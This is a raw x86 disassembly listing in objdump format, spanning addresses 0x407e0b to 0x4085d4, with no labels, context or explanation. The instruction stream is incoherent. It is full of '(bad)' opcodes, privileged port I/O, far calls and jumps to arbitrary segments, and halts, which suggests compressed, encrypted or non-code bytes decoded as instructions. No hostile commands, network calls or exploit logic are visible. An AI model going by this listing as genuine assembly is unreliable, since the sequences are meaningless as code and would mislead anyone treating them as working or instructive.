  407e0b:	or     cl,0x1d
  407e0e:	imul   ecx,DWORD PTR [ebp+edi*8-0x45],0xffffff89
  407e13:	rol    ecx,0x2e
  407e16:	fadd   DWORD PTR [edx+0x60]
  407e19:	adc    DWORD PTR [ebp-0x47],esp
  407e1c:	xor    BYTE PTR [ecx],ch
  407e1e:	mov    WORD PTR [edi],?
  407e20:	and    eax,0xae5ca8ca
  407e25:	inc    ecx
  407e26:	imul   eax,DWORD PTR [ecx-0x66baf64f],0x50
  407e2d:	call   0x4ac45860
  407e32:	pusha  
  407e33:	and    BYTE PTR [ebp+0x9],ah
  407e36:	sti    
  407e37:	and    eax,0xcd8d6aec
  407e3c:	dec    ebx
  407e3d:	int3   
  407e3e:	mov    esp,0x484dee40
  407e43:	les    eax,FWORD PTR [esp+eax*4+0x40791d39]
  407e4a:	push   edi
  407e4b:	out    dx,al
  407e4c:	xchg   ebx,eax
  407e4d:	xor    BYTE PTR [edi-0x58167363],ah
  407e53:	pop    ss
  407e54:	push   0x22692525
  407e59:	sbb    ah,dh
  407e5b:	mov    ebx,0x3a1dbb74
  407e60:	in     eax,dx
  407e61:	push   cs
  407e62:	(bad)  [esi-0x69]
  407e65:	(bad)  
  407e66:	pusha  
  407e67:	dec    eax
  407e68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e69:	(bad)  [ecx-0x7d]
  407e6c:	mov    bh,0x92
  407e6e:	adc    al,0xa5
  407e70:	pop    esp
  407e71:	mov    eax,0xab0f6633
  407e76:	and    BYTE PTR [edx],0x96
  407e79:	cwde   
  407e7a:	cmp    eax,0xa6fd7b34
  407e7f:	fbld   TBYTE PTR [ecx-0xc19f5d8]
  407e85:	cmp    DWORD PTR [ecx-0x6e],ecx
  407e88:	jo     0x407e6f
  407e8a:	retf   0x8615
  407e8d:	ret    
  407e8e:	loope  0x407e93
  407e90:	fwait
  407e91:	fwait
  407e92:	fwait
  407e93:	dec    DWORD PTR [ebx]
  407e95:	lock imul esi,edi,0xffffffa7
  407e99:	and    DWORD PTR [ecx+eax*1-0x253a2120],ebp
  407ea0:	inc    edi
  407ea1:	inc    edx
  407ea2:	ror    BYTE PTR [edi+0x10],cl
  407ea5:	test   eax,0xe295214
  407eaa:	mov    DWORD PTR [edi-0x29d273e4],0xc675e3ca
  407eb4:	ret    0x30ba
  407eb7:	pop    esp
  407eb8:	inc    ebp
  407eb9:	fucomip st,st(7)
  407ebb:	fcmovne st,st(5)
  407ebd:	push   edx
  407ebe:	mov    edi,0xde4ac091
  407ec3:	push   es
  407ec4:	pop    ebx
  407ec5:	mov    BYTE PTR [ebx+0x71],bh
  407ec8:	lea    ebx,[ebx]
  407eca:	je     0x407f30
  407ecc:	fdivr  QWORD PTR [ecx]
  407ece:	xchg   esp,eax
  407ecf:	add    al,0x95
  407ed1:	clc    
  407ed2:	dec    edi
  407ed3:	adc    eax,DWORD PTR [eax]
  407ed5:	ins    BYTE PTR es:[edi],dx
  407ed6:	std    
  407ed7:	jnp    0x407ed9
  407ed9:	test   DWORD PTR [eax+0x3a3d60b9],edx
  407edf:	cwde   
  407ee0:	call   0x9b823ef8
  407ee5:	add    eax,0x30a00408
  407eea:	mov    dh,0xe
  407eec:	push   es
  407eed:	inc    ecx
  407eee:	mov    ecx,0x498a9943
  407ef3:	inc    esp
  407ef4:	sub    al,0xc3
  407ef6:	clc    
  407ef7:	repz mov eax,0x14630aed
  407efd:	mov    ecx,0x397936e
  407f02:	or     bh,BYTE PTR [edi-0x519ed741]
  407f08:	or     eax,0x535894c6
  407f0d:	nop
  407f0e:	in     al,0x13
  407f10:	xchg   edx,eax
  407f11:	fdiv   QWORD PTR [ecx+0x3ec1ee87]
  407f17:	ins    DWORD PTR es:[edi],dx
  407f18:	mov    ecx,0xda73348f
  407f1d:	jmp    0xca5a:0x2deb5e80
  407f24:	mov    al,ds:0x6bd065a4
  407f29:	shr    ebx,cl
  407f2b:	ja     0x407f16
  407f2d:	mov    ah,0x3b
  407f2f:	hlt    
  407f30:	jp     0x407f8f
  407f32:	push   es
  407f33:	and    DWORD PTR [ecx],0xffffff9d
  407f36:	outs   dx,BYTE PTR ds:[esi]
  407f37:	xchg   edi,eax
  407f38:	dec    esi
  407f39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f3a:	dec    ebx
  407f3b:	mov    ebx,0x4a946dd
  407f40:	test   eax,0xa790fa4
  407f45:	call   0xdf54:0x1e88d058
  407f4c:	arpl   WORD PTR [eax],si
  407f4e:	leave  
  407f4f:	repz mov esp,0xe18c6b2a
  407f55:	fidiv  DWORD PTR [ebp-0x5cb97395]
  407f5b:	mov    edi,0xcf73dcf8
  407f60:	jne    0x407fa0
  407f62:	div    BYTE PTR [ecx-0x38e82271]
  407f68:	loopne 0x407f84
  407f6a:	add    dh,ch
  407f6c:	inc    ecx
  407f6d:	(bad)  
  407f6e:	jecxz  0x407fef
  407f70:	cld    
  407f71:	(bad)
  407f75:	mov    ebp,0xf4a702
  407f7a:	push   esp
  407f7b:	jbe    0x407f19
  407f7d:	in     eax,0xd6
  407f7f:	in     eax,dx
  407f80:	cmp    eax,0x1f5da70e
  407f85:	push   ebx
  407f86:	paddw  mm3,QWORD PTR [esi-0x33]
  407f8a:	add    DWORD PTR [eax],edx
  407f8c:	and    eax,0xf9bdc4ee
  407f91:	jge    0x407f37
  407f93:	out    dx,al
  407f94:	(bad)  
  407f95:	cli    
  407f96:	imul   eax,edi,0xffffffe6
  407f99:	sar    DWORD PTR ds:0x939181d,0x1b
  407fa0:	test   DWORD PTR [ebx+ebp*8-0x17494b77],0x961792d2
  407fab:	cmp    al,0x77
  407fad:	dec    edx
  407fae:	arpl   sp,si
  407fb0:	ret    0x21ad
  407fb3:	jno    0x40801b
  407fb5:	inc    eax
  407fb6:	repz jbe 0x407fa3
  407fb9:	mov    al,BYTE PTR [bx+si+0x6fc0]
  407fbe:	lods   al,BYTE PTR ds:[esi]
  407fbf:	rol    cl,0x2e
  407fc2:	mov    dh,0x99
  407fc4:	js     0x408021
  407fc6:	or     al,0xc
  407fc8:	jle    0x407f85
  407fca:	mov    es,WORD PTR [eax]
  407fcc:	sub    DWORD PTR [esi],eax
  407fce:	pop    es
  407fcf:	jecxz  0x407f6e
  407fd1:	nop
  407fd2:	aad    0xef
  407fd4:	cwde   
  407fd5:	pop    ecx
  407fd6:	call   0x11016fa0
  407fdb:	ret    0xeef1
  407fde:	mov    ebx,0xa5169b44
  407fe3:	outs   dx,BYTE PTR ds:[esi]
  407fe4:	xchg   ecx,eax
  407fe5:	xchg   edi,eax
  407fe6:	jge    0x40803f
  407fe8:	(bad)  
  407fe9:	sti    
  407fea:	and    BYTE PTR [esi],ah
  407fec:	(bad)  
  407fed:	pusha  
  407fee:	mov    WORD PTR [esi],es
  407ff0:	xchg   ebx,eax
  407ff1:	xchg   ebx,eax
  407ff2:	mov    BYTE PTR [ecx],ch
  407ff4:	dec    edx
  407ff5:	iret   
  407ff6:	push   ecx
  407ff7:	cmp    ah,BYTE PTR [ebx]
  407ff9:	fnstsw WORD PTR [ebx]
  407ffb:	inc    esp
  407ffc:	in     al,dx
  407ffd:	cmp    ah,BYTE PTR [eax-0x5896b3b0]
  408003:	pop    es
  408004:	and    al,0x52
  408006:	xchg   ebx,eax
  408007:	dec    eax
  408008:	ret    
  408009:	inc    esi
  40800a:	dec    edi
  40800b:	xor    eax,ebp
  40800d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40800e:	hlt    
  40800f:	mov    edx,0xebdfa2d
  408014:	in     eax,dx
  408015:	jbe    0x407fa2
  408017:	inc    esp
  408018:	and    eax,0xda424924
  40801d:	push   0xffffff91
  40801f:	and    al,0x2d
  408021:	rcl    BYTE PTR [esi-0x65],cl
  408024:	shl    DWORD PTR [eax-0x50],0x70
  408028:	sub    BYTE PTR [ebx+0x5a608500],dh
  40802e:	sbb    al,0x1e
  408030:	push   ds
  408031:	mov    ds:0x50254bb5,al
  408036:	dec    edx
  408037:	xor    DWORD PTR [esi],ebx
  408039:	(bad)  
  40803a:	cdq    
  40803b:	dec    esp
  40803c:	es (bad) 
  40803f:	push   es
  408040:	add    DWORD PTR [edi-0x20523c90],0xffffffb1
  408047:	lods   al,BYTE PTR ds:[esi]
  408048:	add    eax,esp
  40804a:	push   ds
  40804b:	and    al,0x4d
  40804d:	shr    DWORD PTR [ebp+0x9],cl
  408050:	out    dx,eax
  408051:	xor    edx,esi
  408053:	add    BYTE PTR cs:[eax],al
  408056:	stos   BYTE PTR es:[edi],al
  408057:	mov    eax,ds:0xddaed7b6
  40805c:	bound  edx,QWORD PTR [esi-0x344caf93]
  408062:	jecxz  0x4080d4
  408064:	fcmovnu st,st(3)
  408066:	jb     0x408068
  408068:	inc    esi
  408069:	out    0x40,al
  40806b:	ror    DWORD PTR [eax+esi*4],cl
  40806e:	jle    0x40800f
  408070:	cmp    BYTE PTR [esi-0x31],cl
  408073:	mov    esi,0x2803c14a
  408078:	ror    DWORD PTR [eax-0x6c9577ea],1
  40807e:	add    eax,0xcc33d61f
  408083:	xor    ecx,ecx
  408085:	cmp    al,0xb3
  408087:	int3   
  408088:	xor    ecx,DWORD PTR [ebx+0x5e]
  40808b:	or     BYTE PTR [edx+0x53],cl
  40808e:	push   edi
  40808f:	hlt    
  408090:	fmul   DWORD PTR [eax+ebx*2]
  408093:	in     eax,0x7f
  408095:	ins    BYTE PTR es:[edi],dx
  408096:	ret    0x7c52
  408099:	lods   al,BYTE PTR ds:[esi]
  40809a:	mov    DWORD PTR [edx],ecx
  40809c:	fdivr  DWORD PTR [eax+0x6ae857ac]
  4080a2:	jnp    0x4080b7
  4080a4:	cmp    BYTE PTR [edx],bl
  4080a6:	mov    edi,0x303db44d
  4080ab:	or     eax,0x8af85383
  4080b0:	popa   
  4080b1:	inc    esp
  4080b2:	inc    eax
  4080b3:	adc    DWORD PTR [ebx],eax
  4080b5:	dec    ecx
  4080b6:	push   eax
  4080b7:	jl     0x408124
  4080b9:	push   ss
  4080ba:	mov    WORD PTR [ebx+0x246312d4],fs
  4080c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080c1:	dec    ebp
  4080c2:	sub    ebx,ecx
  4080c4:	inc    dl
  4080c6:	dec    edi
  4080c7:	popa   
  4080c8:	push   ss
  4080c9:	dec    esp
  4080ca:	and    eax,0x9750e12f
  4080cf:	push   0x8d4b625d
  4080d4:	fstp   QWORD PTR [edi-0x4ef089df]
  4080da:	in     eax,0x1c
  4080dc:	imul   ecx,DWORD PTR [esi],0xa47dcae9
  4080e2:	cdq    
  4080e3:	mov    eax,ds:0x209848c8
  4080e8:	in     eax,dx
  4080e9:	test   BYTE PTR [esi+0x4b],cl
  4080ec:	icebp  
  4080ed:	mov    bh,0xff
  4080ef:	neg    bh
  4080f1:	inc    edx
  4080f2:	test   eax,0x1fef52ee
  4080f7:	cld    
  4080f8:	add    al,0xb7
  4080fa:	outs   dx,BYTE PTR ds:[esi]
  4080fb:	frstor [edx]
  4080fd:	iret   
  4080fe:	jae    0x408152
  408100:	aas    
  408101:	ret    
  408102:	push   esp
  408103:	pop    ecx
  408104:	xchg   esi,eax
  408105:	in     al,dx
  408106:	out    dx,al
  408107:	out    dx,al
  408108:	mov    dh,0x37
  40810a:	ss ss push ds
  40810d:	arpl   WORD PTR ds:0x79503f00,cx
  408113:	dec    eax
  408114:	dec    eax
  408115:	fst    DWORD PTR [ecx-0x2a]
  408118:	(bad)  
  408119:	aad    0xcd
  40811b:	xchg   DWORD PTR [eax],eax
  40811d:	scas   eax,DWORD PTR es:[edi]
  40811e:	pop    esi
  40811f:	(bad)  [ebx]
  408121:	iret   
  408122:	dec    edi
  408123:	lock into 
  408125:	ins    BYTE PTR es:[edi],dx
  408126:	hlt    
  408127:	add    BYTE PTR [esi],dl
  408129:	push   es
  40812a:	test   BYTE PTR [edx+0x28],ch
  40812d:	in     al,0x3b
  40812f:	xchg   esp,eax
  408130:	pop    edx
  408131:	scas   al,BYTE PTR es:[edi]
  408132:	shl    DWORD PTR [ecx-0x68],0x87
  408136:	jne    0x408102
  408138:	fs sub al,0x46
  40813b:	or     ecx,DWORD PTR [edx+0x20cf32c2]
  408141:	retf   
  408142:	pop    ebp
  408143:	mov    ds:0x283b340f,eax
  408148:	loopne 0x408127
  40814a:	or     BYTE PTR [esi],0xa2
  40814d:	icebp  
  40814e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40814f:	jb     0x408188
  408151:	pop    eax
  408152:	lahf   
  408153:	out    dx,eax
  408154:	sbb    BYTE PTR [ecx-0x70a41de1],bh
  40815a:	lea    esp,[ebx+0x2e220c55]
  408160:	sbb    eax,DWORD PTR [ebx+0x23e5541]
  408166:	xchg   eax,ebx
  408168:	in     al,dx
  408169:	mov    al,0xd4
  40816b:	pop    ecx
  40816c:	inc    esp
  40816d:	pusha  
  40816e:	or     al,0xc1
  408170:	push   edi
  408171:	shl    DWORD PTR [esi+ebx*2-0x3a],1
  408175:	mov    WORD PTR [edx-0x590fc8ce],fs
  40817b:	xchg   ecx,eax
  40817c:	dec    ecx
  40817d:	cld    
  40817e:	pop    es
  40817f:	repnz mov dl,0x4f
  408182:	pop    esi
  408183:	sahf   
  408184:	mov    al,ds:0xb01590d0
  408189:	cmp    esi,DWORD PTR [edi]
  40818b:	int3   
  40818c:	out    0x25,eax
  40818e:	mov    bl,0xac
  408190:	and    BYTE PTR [edi+0x5e25384f],bl
  408196:	loopne 0x4081bf
  408198:	aaa    
  408199:	scas   eax,DWORD PTR es:[edi]
  40819a:	xchg   edx,eax
  40819b:	and    al,0x49
  40819d:	xchg   ebp,eax
  40819e:	and    bl,BYTE PTR ds:0xdb61fef7
  4081a4:	ins    BYTE PTR es:[edi],dx
  4081a5:	ss pop ebx
  4081a7:	retf   0xc83b
  4081aa:	mov    dl,0xcc
  4081ac:	pop    eax
  4081ad:	imul   ebp,edi,0x5b
  4081b0:	pop    esi
  4081b1:	rcr    BYTE PTR [edx],0x0
  4081b4:	out    dx,al
  4081b5:	inc    ecx
  4081b6:	je     0x408211
  4081b8:	mov    esi,0x895ab547
  4081bd:	push   esp
  4081be:	retf   0x9185
  4081c1:	lods   al,BYTE PTR ds:[esi]
  4081c2:	fwait
  4081c3:	jl     0x408208
  4081c5:	dec    edx
  4081c6:	dec    ecx
  4081c7:	sahf   
  4081c8:	iret   
  4081c9:	mov    ecx,0x5cca6376
  4081ce:	mov    bh,0x8f
  4081d0:	ja     0x4081a4
  4081d2:	pop    eax
  4081d3:	shr    DWORD PTR [ebp+0x40c98778],0x31
  4081da:	ror    DWORD PTR [eax+0x577bf47b],cl
  4081e0:	hlt    
  4081e1:	sbb    bh,al
  4081e3:	inc    esp
  4081e4:	neg    DWORD PTR [eax+0x39]
  4081e7:	in     eax,dx
  4081e8:	mov    ah,0x8b
  4081ea:	fbld   TBYTE PTR [edi+0x5]
  4081ed:	int3   
  4081ee:	jae    0x4081b8
  4081f0:	jae    0x408261
  4081f2:	sbb    DWORD PTR [ebx],0x6f
  4081f5:	iret   
  4081f6:	stos   DWORD PTR es:[edi],eax
  4081f7:	lds    ebp,FWORD PTR [ecx-0x12]
  4081fa:	sub    BYTE PTR [ebx],ch
  4081fc:	div    BYTE PTR [edi]
  4081fe:	sbb    eax,0xd222cd88
  408203:	pop    ds
  408204:	mov    bh,0x8a
  408206:	inc    ecx
  408207:	sbb    al,0xc9
  408209:	sub    bl,BYTE PTR [edx]
  40820b:	sti    
  40820c:	xchg   esi,eax
  40820d:	fadd   DWORD PTR [ebx]
  40820f:	or     esp,DWORD PTR [eax-0x78]
  408212:	cdq    
  408213:	inc    esp
  408214:	int3   
  408215:	and    BYTE PTR [edx],al
  408217:	imul   ebp,DWORD PTR [eax+0x186220c0],0x1
  40821e:	sbb    al,0x82
  408220:	pop    ecx
  408221:	push   edx
  408222:	cdq    
  408223:	sbb    ch,ah
  408225:	and    al,BYTE PTR [edx+0x11]
  408228:	add    al,ah
  40822a:	xor    BYTE PTR [ebx-0x1ce90cb4],dl
  408230:	jns    0x4081bd
  408232:	mov    ebp,0xd89e9f71
  408237:	out    0x91,al
  408239:	xchg   DWORD PTR [ebx-0x2e],edx
  40823c:	xor    al,0xa5
  40823e:	sub    al,0xb5
  408240:	scas   eax,DWORD PTR es:[edi]
  408241:	cmp    DWORD PTR [edx+0x44],0xffffffa1
  408245:	hlt    
  408246:	jmp    0x408293
  408248:	xor    al,0x23
  40824a:	or     DWORD PTR [ebp+0x59],esp
  40824d:	push   ss
  40824e:	pop    edx
  40824f:	jmp    0x40822c
  408251:	ja     0x4081fc
  408253:	in     eax,0x7b
  408255:	xchg   esi,eax
  408256:	xor    eax,0x2883dc00
  40825b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40825c:	fiadd  WORD PTR [edi+0x200735b5]
  408262:	mov    eax,0x6f374041
  408267:	in     al,dx
  408268:	jno    0x408255
  40826a:	sbb    BYTE PTR ss:[ebx+0x3c02111e],dl
  408271:	call   0xb595:0x565ddf62
  408278:	mov    esp,0xaa2e4e3
  40827d:	sbb    al,0x7c
  40827f:	stos   DWORD PTR es:[edi],eax
  408280:	mov    edi,0x8c58f823
  408285:	adc    eax,0x265b31be
  40828a:	push   ebx
  40828b:	ret    
  40828c:	sub    bl,BYTE PTR fs:[eax-0x41a6fa34]
  408293:	call   0x70e415a1
  408298:	ins    BYTE PTR es:[edi],dx
  408299:	aad    0xed
  40829b:	(bad)  
  40829d:	jbe    0x40823a
  40829f:	mov    ebx,0xa2f8a444
  4082a4:	push   ecx
  4082a5:	loopne 0x408315
  4082a7:	clc    
  4082a8:	push   esi
  4082a9:	push   ebp
  4082aa:	jns    0x4082b8
  4082ac:	push   ds
  4082ad:	jbe    0x408274
  4082af:	ja     0x408330
  4082b1:	out    dx,eax
  4082b2:	loope  0x40824c
  4082b4:	cmp    BYTE PTR es:[edx+esi*2-0x4bbc7eb],al
  4082bc:	lea    esp,[edi+0x1]
  4082bf:	and    DWORD PTR [edx+0x62],ebx
  4082c2:	lods   al,BYTE PTR ds:[esi]
  4082c3:	push   ebx
  4082c4:	cld    
  4082c5:	ret    0xc083
  4082c8:	cmp    al,0x87
  4082ca:	ret    
  4082cb:	sbb    DWORD PTR [edi+eiz*2+0x368052d0],ecx
  4082d2:	or     al,0xed
  4082d4:	pushf  
  4082d5:	lea    eax,[ecx+0xf]
  4082d8:	sub    DWORD PTR [esi+edx*8],esp
  4082db:	xchg   esi,eax
  4082dc:	sub    esi,ebx
  4082de:	pop    es
  4082df:	repnz cmp al,0x67
  4082e2:	jg     0x408363
  4082e4:	mov    edi,0x4a520006
  4082e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082ea:	shr    DWORD PTR [ecx-0x41082103],cl
  4082f0:	mov    bh,0x66
  4082f2:	add    BYTE PTR [edi],bh
  4082f4:	dec    eax
  4082f5:	dec    ecx
  4082f6:	xchg   edx,eax
  4082f7:	in     al,0xa4
  4082f9:	rcr    edx,1
  4082fb:	lea    eax,[ecx]
  4082fd:	mov    BYTE PTR [esi+0x1],al
  408300:	sub    ch,BYTE PTR [ecx]
  408302:	cmp    DWORD PTR [eax],edi
  408304:	fsub   DWORD PTR [edi-0x1]
  408307:	inc    eax
  408308:	xor    ch,0xc3
  40830b:	and    BYTE PTR [ebx+0x7b],0xff
  40830f:	pop    esi
  408310:	jns    0x408383
  408312:	fsub   QWORD PTR [edx]
  408314:	imul   eax,edi,0xffffffbd
  408317:	popf   
  408318:	fidivr WORD PTR [eax+eax*4]
  40831b:	xor    ecx,0x1a
  40831e:	sbb    DWORD PTR [ebx],edi
  408320:	sbb    eax,0x2cb4aa6b
  408325:	mov    eax,ds:0xb18e3755
  40832a:	push   ss
  40832b:	mov    WORD PTR [esi+0x32cc0514],?
  408331:	cwde   
  408332:	into   
  408333:	sub    eax,0x163b9b3
  408338:	test   DWORD PTR [esi+0x61c9a796],eax
  40833e:	cmp    al,BYTE PTR [ebx-0x30e4c606]
  408344:	fcmovu st,st(4)
  408346:	(bad)  
  408347:	xchg   esp,eax
  408348:	jecxz  0x408304
  40834a:	xor    bl,BYTE PTR [edx+0x10011e87]
  408350:	dec    ebp
  408351:	repz and edi,DWORD PTR [esi]
  408354:	push   edi
  408355:	add    BYTE PTR [ecx-0x4f9d9a1a],al
  40835b:	mov    ch,cl
  40835d:	mov    bh,BYTE PTR [eax+0x7f]
  408360:	xor    BYTE PTR ds:0xf5a10662,ah
  408366:	and    bh,cl
  408368:	imul   edx,esi,0x2912d172
  40836e:	fdivr  QWORD PTR [esi+0x75f4d73c]
  408374:	xchg   BYTE PTR [edx-0x63],dl
  408377:	push   0x10
  408379:	push   esp
  40837a:	dec    esp
  40837b:	std    
  40837c:	inc    ebx
  40837d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40837e:	imul   ebx,DWORD PTR [ecx-0x6a],0x2fefefec
  408385:	and    eax,0xf7ad6914
  40838a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40838b:	shr    ecx,cl
  40838d:	mov    ch,0xbb
  40838f:	aam    0xd2
  408391:	cmp    eax,0xee001acb
  408396:	inc    ecx
  408397:	lods   al,BYTE PTR ds:[esi]
  408398:	mov    ch,0x43
  40839a:	and    dh,0x52
  40839d:	pusha  
  40839e:	inc    edx
  40839f:	dec    edx
  4083a0:	mov    BYTE PTR [edi+0x130e0e13],0x17
  4083a7:	sbb    bh,BYTE PTR [ebx]
  4083a9:	lea    ecx,ss:[edi-0x41388763]
  4083b0:	sub    edi,DWORD PTR [edi-0x54]
  4083b3:	xor    WORD PTR [edi],ax
  4083b6:	sar    DWORD PTR [ebp+0x7575131c],0x95
  4083bd:	(bad)  
  4083be:	fcomp  QWORD PTR [ecx-0x26a4c7b7]
  4083c4:	push   edx
  4083c5:	xchg   esp,eax
  4083c6:	or     dh,BYTE PTR cs:[eax]
  4083c9:	iret   
  4083ca:	pusha  
  4083cb:	sahf   
  4083cc:	cmp    eax,DWORD PTR [edi+0x60]
  4083cf:	mov    BYTE PTR [eax],cl
  4083d1:	sbb    BYTE PTR [ebx],cl
  4083d3:	mov    dl,0x79
  4083d5:	call   0x9a7f:0x5de02a6
  4083dc:	mov    bh,0xf8
  4083de:	mov    dh,0xc4
  4083e0:	pop    ds
  4083e1:	pop    edi
  4083e2:	xchg   esi,eax
  4083e3:	and    eax,0x90a468c6
  4083e8:	push   esp
  4083e9:	sub    edi,DWORD PTR [eax]
  4083eb:	xor    eax,0xc808ddaf
  4083f0:	les    ebx,FWORD PTR [eax+0x2c]
  4083f3:	sbb    eax,eax
  4083f5:	mov    al,0x84
  4083f7:	shl    DWORD PTR [ebp+0x6076758d],1
  4083fd:	xchg   esp,eax
  4083fe:	arpl   WORD PTR [esi+0x4a],ax
  408401:	mov    ebx,0xe42516f3
  408406:	push   es
  408407:	pop    edx
  408408:	cmp    DWORD PTR [edx+edx*4+0x182a7e92],esi
  40840f:	push   cs
  408410:	aaa    
  408411:	xor    DWORD PTR [edx+0x3f1b25c],edi
  408417:	and    BYTE PTR [eax-0x53],ch
  40841a:	xchg   edi,eax
  40841b:	idiv   cl
  40841d:	out    dx,eax
  40841e:	push   edi
  40841f:	test   BYTE PTR [eax],dl
  408421:	imul   eax,DWORD PTR [esi],0xfffffff0
  408424:	adc    DWORD PTR [ecx+eiz*1],0xffffffe5
  408428:	mov    dh,0xd1
  40842a:	sbb    bl,BYTE PTR [ecx]
  40842c:	add    eax,DWORD PTR [eax-0x6794a7f0]
  408432:	dec    esi
  408433:	out    0x1c,al
  408435:	into   
  408436:	jp     0x408440
  408438:	popa   
  408439:	sbb    eax,0x94b66c8d
  40843e:	call   0x2d51:0xdce81d7d
  408445:	cld    
  408446:	push   cs
  408447:	lods   eax,DWORD PTR ds:[esi]
  408448:	jg     0x40846f
  40844a:	sub    edi,DWORD PTR [eax]
  40844c:	jmp    0x3dc6:0x874ca3f8
  408453:	aad    0x1e
  408455:	xor    dh,al
  408457:	loopne 0x408413
  408459:	push   ss
  40845a:	pop    ebx
  40845b:	imul   edx,DWORD PTR [ecx],0xffffffd6
  40845e:	mov    ds:0xcb6b408d,al
  408463:	cmp    al,0xb7
  408465:	mov    es,WORD PTR [ecx]
  408467:	int3   
  408468:	sbb    al,0x10
  40846a:	adc    al,0xe5
  40846c:	ret    0x500c
  40846f:	repnz or BYTE PTR [ebx],dh
  408472:	loopne 0x4084ac
  408474:	push   edx
  408475:	stos   DWORD PTR es:[edi],eax
  408476:	ret    
  408477:	and    ecx,DWORD PTR [eax+0x64d511cf]
  40847d:	lea    esp,[ecx+0x6f]
  408480:	out    dx,eax
  408481:	es xchg edi,eax
  408483:	cs mov esp,0x5f37f9ce
  408489:	and    ecx,edi
  40848b:	xor    edx,DWORD PTR [edx+edx*2+0x3c9b870c]
  408492:	idiv   al
  408494:	xchg   ebx,eax
  408495:	pushf  
  408496:	cmp    al,0xfd
  408498:	add    ch,bh
  40849a:	rol    DWORD PTR [esi-0x13],0x52
  40849e:	icebp  
  40849f:	xor    eax,0xaed6a402
  4084a4:	fnstsw WORD PTR [eax+0x8be559f]
  4084aa:	lock push es
  4084ac:	pop    ecx
  4084ad:	enter  0xf073,0xaf
  4084b1:	dec    edx
  4084b2:	clc    
  4084b3:	pop    esi
  4084b4:	mov    edi,0x9ffa3895
  4084b9:	sub    BYTE PTR [eax-0x55],ch
  4084bc:	sbb    BYTE PTR [esi+0x6a],0x19
  4084c0:	or     al,0x6
  4084c2:	xchg   esp,eax
  4084c3:	arpl   WORD PTR ds:[eax-0x2b],si
  4084c7:	cld    
  4084c8:	push   es
  4084c9:	jns    0x40847f
  4084cb:	mov    edx,0x781dbc54
  4084d0:	jmp    0x4084f1
  4084d2:	inc    bl
  4084d4:	jg     0x40852e
  4084d6:	lods   al,BYTE PTR ds:[esi]
  4084d7:	mov    eax,0x6b25b785
  4084dc:	add    BYTE PTR [eax+0x73ee7c8b],bh
  4084e2:	lahf   
  4084e3:	xchg   ebx,eax
  4084e4:	dec    edx
  4084e5:	retf   0x2513
  4084e8:	ds pop es
  4084ea:	and    BYTE PTR [eax+ebp*1-0x21238d64],bh
  4084f1:	popf   
  4084f2:	xor    bl,BYTE PTR [edi-0x22b1af47]
  4084f8:	(bad)  
  4084f9:	aas    
  4084fa:	mov    ss,WORD PTR [esi]
  4084fc:	xor    al,0x4c
  4084fe:	xchg   DWORD PTR [eax-0x1825b87c],esp
  408504:	add    DWORD PTR [edx+eax*1+0x28],edx
  408508:	js     0x408530
  40850a:	ror    DWORD PTR [esp+ebx*1+0x55f9d12c],1
  408511:	(bad)  
  408512:	(bad)  
  408514:	(bad)  
  408515:	cmp    BYTE PTR [ecx+ebx*2+0x6d],bh
  408519:	aaa    
  40851a:	sbb    BYTE PTR [ebx+0x6ccb0a28],ch
  408520:	outs   dx,BYTE PTR ds:[esi]
  408521:	cdq    
  408522:	into   
  408523:	sub    al,0x87
  408525:	xor    ecx,ebx
  408527:	je     0x408557
  408529:	enter  0x2832,0x3b
  40852d:	or     ecx,DWORD PTR [edi+0x79]
  408530:	lea    esp,[ecx-0x5]
  408533:	push   ebx
  408534:	or     dh,BYTE PTR [ecx-0x15c64e50]
  40853a:	xchg   ecx,eax
  40853b:	out    dx,al
  40853c:	push   edx
  40853d:	cmp    eax,0xfc39c470
  408542:	mov    dh,0xd9
  408544:	je     0x408508
  408546:	sbb    ebp,DWORD PTR [edi+0x5bbd877e]
  40854c:	pop    ss
  40854d:	push   eax
  40854e:	shl    al,cl
  408550:	shr    cl,0xa1
  408553:	mov    bh,0xd6
  408555:	fdiv   QWORD PTR [ebx+0x45eb795c]
  40855b:	pop    esi
  40855c:	jns    0x408547
  40855e:	pop    ebx
  40855f:	ins    BYTE PTR es:[edi],dx
  408560:	in     eax,dx
  408561:	pushf  
  408562:	in     eax,0xa9
  408564:	lahf   
  408565:	clc    
  408566:	or     BYTE PTR [ebx+0x4abb90c1],al
  40856c:	test   al,0x86
  40856e:	(bad)  
  40856f:	jne    0x40850c
  408571:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408572:	inc    esi
  408573:	and    eax,0xc17d516a
  408578:	sub    al,0x50
  40857a:	ror    BYTE PTR ds:0x3033f2a6,cl
  408580:	mov    al,ds:0x5f2e944
  408585:	xchg   edx,eax
  408586:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408587:	pop    edx
  408588:	xor    al,0x46
  40858a:	mov    ebx,0xa76b20f5
  40858f:	call   0x2441:0x8b5a74e
  408596:	scas   eax,DWORD PTR es:[edi]
  408597:	(bad)  
  408599:	(bad)  
  40859a:	out    dx,eax
  40859b:	pop    ebp
  40859c:	(bad)  
  40859d:	add    BYTE PTR [eax+0x17],dh
  4085a0:	xor    esi,eax
  4085a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085a3:	mov    edx,0x10a5372c
  4085a8:	cmc    
  4085a9:	ja     0x4085d9
  4085ab:	add    al,0x58
  4085ad:	int    0xed
  4085af:	mov    ebp,0xd7b8ac8c
  4085b4:	adc    al,0xe0
  4085b6:	inc    esi
  4085b7:	(bad)  
  4085b9:	dec    edi
  4085ba:	stc    
  4085bb:	add    DWORD PTR [edi+0x29],eax
  4085be:	repz cmp eax,0xae38516a
  4085c4:	shr    cl,cl
  4085c6:	out    0x71,al
  4085c8:	jno    0x408559
  4085ca:	outs   dx,DWORD PTR ds:[esi]
  4085cb:	shr    BYTE PTR [edx-0x46a4f086],0x5
  4085d2:	sub    al,0x5a
  4085d4:	or     esi,DWORD PTR [edx+0x1f]
